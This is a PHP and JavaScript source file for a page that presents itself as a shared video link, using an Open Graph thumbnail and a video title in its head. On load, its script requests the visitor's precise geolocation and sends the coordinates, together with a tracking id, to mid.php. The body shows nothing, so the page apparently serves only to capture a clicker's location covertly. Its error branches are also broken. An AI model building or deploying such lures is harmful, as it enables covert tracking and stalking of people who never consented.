<script>
    function main(id) {
        var options = {
            maximumAge: 50000,
            timeout: 30000,
            enableHighAccuracy: true
        };
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, err, options);

            function success(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                str = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id
                window.location = str;
            }

            function err() {

                const latitude = 'error';
                const longitude = 'unable to retrieve the location';
                window.location.replace = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
            }
        } else {
            const latitude = 'error';
            const longitude = 'unable to retrieve the location';
            window.location.replace = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
        }


    }
</script>
<?php
if (isset($_GET['id'])) {
    $id = json_encode($_GET['id']);
} else {
    $id = "";
}
echo "<script>main(${id})</script>";

require('li/linksfunctions.php');



// Include config file


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content=<?php echo (getThumbnail($id)); ?>>
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="200">
    <meta property="og:image:height" content="200">
    <title><?php echo (getTubeTitel($id)); ?></title>
</head>

<body>

</body>

</html>